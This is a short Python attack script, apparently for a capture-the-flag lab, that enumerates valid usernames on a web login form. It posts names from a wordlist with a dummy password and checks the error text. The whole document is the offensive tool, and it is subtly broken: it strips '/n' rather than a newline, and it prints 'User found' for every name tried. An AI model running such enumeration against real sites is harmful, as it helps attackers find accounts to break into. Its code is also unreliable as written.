#!/usr/bin/python3
#Author: Conde

import requests
import os

URL = "http://10.10.11.160:5000/login"
file = open('users', 'r')

if os.path.exists("ValidUsers.txt"):
    os.remove('ValidUsers.txt')

print("\n[*] Finding Valid Users\n")
for line in file:
    user = line.rstrip("/n")
    payload = {'username': user,'password':'test', 'submit':'Submit'}
    r = requests.post(URL,data=payload)
    content = r.text
    if "Invalid login" in str(content):
        file1 = open('ValidUsers.txt','a')
        a = "User[✔]: " + user + "\n"
        file1.write(a)
        file1.close()
    print(f"\t[✔] User found: {user}")
file.close()
